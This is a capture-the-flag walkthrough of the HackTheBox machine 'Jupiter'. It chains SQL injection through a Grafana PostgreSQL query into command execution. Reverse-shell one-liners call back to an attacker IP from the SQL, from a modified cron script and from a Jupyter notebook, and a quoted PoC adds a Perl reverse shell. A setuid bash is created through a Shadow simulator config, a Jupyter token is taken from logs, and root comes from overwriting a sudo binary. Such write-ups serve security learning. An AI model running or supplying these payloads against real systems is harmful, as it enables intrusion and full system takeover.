I started with basic NMAP Recon

Recon:

~~~
nmap -sCV 10.10.11.216
~~~

~~~
┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ sudo nmap -sCV -Pn 10.10.11.216       
[sudo] password for mrg0d: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-13 16:20 IST
Nmap scan report for jupiter.htb (10.10.11.216)
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ac5bbe792dc97a00ed9ae62b2d0e9b32 (ECDSA)
|_  256 6001d7db927b13f0ba20c6c900a71b41 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Home | Jupiter
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.58 seconds
~~~

I added jupiter.htb to my host file 
~~~
sudo nano /etc/hosts
~~~

~~~
echo "10.10.11.216 jupiter.htb" >> /etc/hosts
~~~

I don't get anything special or hints . So i went for further enumeration , there i used ffuf 

![[Screenshot_2023-06-06_00-10-33.png]]

Got "kiosk" add it to hosts file , kiosk.jupiter.htb

![[Pasted image 20230613162636.png]]


Yes it is Grafana ...!!!

![[grafana version.png]]

I made my burpsuite on....

looking all the request and response , there i found API

![[API DS QUERY.png]]

I saw the request:

~~~
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 24
x-plugin-id: postgres
Origin: http://kiosk.jupiter.htb
Content-Length: 484
Connection: close

{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"select \n  name as \"Name\", \n  parent as \"Parent Planet\", \n  meaning as \"Name Meaning\" \nfrom \n  moons \nwhere \n  parent = 'Saturn' \norder by \n  name desc;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":938}],"range":{"from":"2023-06-12T23:02:44.224Z","to":"2023-06-13T05:02:44.224Z","raw":{"from":"now-6h","to":"now"}},"from":"1686610964224","to":"1686632564224"}
~~~

Found rawsql.!!! may be sql Injection..!!

i googled for the hints also for further enumeration...!!!!!

Found this : https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce

~~~
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
~~~

This is the PoC , we are going to use,

We have to modify the request , 

~~~
"rawSql":"CREATE TABLE cmd_cf(cmd_output text); COPY cmd_cf FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.158/54321 0>&1\"'",
~~~

With this we will get RCE, 

~~~
nc -lvnp 54321
~~~


![[Pasted image 20230613163851.png]]
![[Pasted image 20230613164202.png]]

There i tried to install pspy64 for checking the anonymous process which are running ,

got some hints,

There i can see ,
~~~2023/06/08 02:48:01 CMD: UID=1000 PID=1842   | /bin/sh -c /home/juno/shadow-simulation.sh 
2023/06/08 02:48:01 CMD: UID=1000 PID=1843   | /bin/bash /home/juno/shadow-simulation.sh 
2023/06/08 02:48:01 CMD: UID=1000 PID=1845   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml                                                                               
2023/06/08 02:48:01 CMD: UID=1000 PID=1848   | 
2023/06/08 02:48:01 CMD: UID=1000 PID=1849   | lscpu --online --parse=CPU,CORE,SOCKET,NODE 
2023/06/08 02:48:01 CMD: UID=1000 PID=1854   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml                                                                               
2023/06/08 02:48:01 CMD: UID=1000 PID=1855   | /usr/bin/curl -s server 
2023/06/08 02:48:01 CMD: UID=1000 PID=1857   | /usr/bin/curl -s server 
2023/06/08 02:48:01 CMD: UID=1000 PID=1859   | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml                                                                               
2023/06/08 02:48:01 CMD: UID=1000 PID=1864   | cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
~~~

My eyes caught network-simulation.yml,
~~~
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
  ~~~



Reference Link : https://shadow.github.io/docs/guide/getting_started_basic.html


My configured network-simulation.yml
~~~
```
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s
```
~~~

We can overwrite the existing file using `wget -O`. Afterwards, we can easily get a user shell:

Got shell as juno,
![[Pasted image 20230613201857.png]]

But with that we cant read user flag , which is in jovian 's home category.

**Jupyter --> Jovian Shell**

To read user flag , i can see **shadow-simulation.sh**
~~~
cat shadow-simulation.sh
~~~

~~~
#!/bin/bash
cd /dev/shm
rm -rf /dev/shm/shadow.data
/home/juno/.local/bin/shadow /dev/shm/*.yml
cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
~~~

I have write access for that file...!!

I add this line at last,

~~~
/bin/bash -i >& /dev/tcp/10.10.14.158/4321 0>&1
~~~

Finally , file will look like this,

~~~
#!/bin/bash
cd /dev/shm
rm -rf /dev/shm/shadow.data
/home/juno/.local/bin/shadow /dev/shm/*.yml
cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
/bin/bash -i >& /dev/tcp/10.10.14.158/4321 0>&1
~~~

I setup a nc listener on other side ,

~~~
nc -lvnp 4321
~~~

![[Pasted image 20230613202145.png]]

Yep..!! Got this ...Because already i saw this process running in background by running pspy64...!!!

After this i checked for service running ,

~~~
netstat -tulpn
~~~

![[Pasted image 20230613202835.png]]

i made port forwarding by importing chisel to my machine,

Chisel server Setup,

~~~
./chisel server -p 8003 --reverse
~~~~

Chisel client setup,

~~~
./chisel client 10.10.14.158:8003 R:8888:localhost:8888
~~~

![[Pasted image 20230613203111.png]]

Got this Page , when i visit to http://127.0.0.1:8888,

It asks for some token or password, so i again searched for some tokens,

There was some token required before we could visit the site. Normally, I'd access this through running `jupyter notebook list`, but there are Python errors with this method. So, we would have to find the source of this website instead to either fix the error or view the logs to find a token. A bit of enumeration reveals that the `/opt` directory contains some interesting files:

~~~
juno@jupiter:/opt$ ls
solar-flares
juno@jupiter:/opt$ cd solar-flares/
juno@jupiter:/opt/solar-flares$ ls
cflares.csv  flares.html   logs     mflares.csv  xflares.csv
flares.csv   flares.ipynb  map.jpg  start.sh
~~~

There i check my logs , there i found many tokens,
![[logs.png]]

~~~
cat *.logs | grep token
~~~

Found many tokens and tried one by one.

Finally this one works for me,

~~~
http://localhost:8888/?token=c339b49ba29e06f20bc485ed7c389f6adef8db42c1248f89
~~~

![[entry login.png]]

I see new 

![[Pasted image 20230613204219.png]]

![[Pasted image 20230613204249.png]]

![[Pasted image 20230613204303.png]]

It gave me a shell  ,

~~~
import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.14.158/5555 0>&1"')
~~~

![[jovian.png]]

I wasn't sure what this binary did, but we have write access over it for some reason:

~~~
jovian@jupiter:/opt/solar-flares$ ls -la /usr/local/bin/sattrack
ls -la /usr/local/bin/sattrack
-rwxrwxr-x 1 jovian jovian 1113632 Mar  8 12:07 /usr/local/bin/sattrack
~~~

We can just overwrite this with `/bin/bash`, and then run it using `sudo` to get an easy root shell.

![[Pasted image 20230613204912.png]]

yep...!!!  Completed the Box.....!!!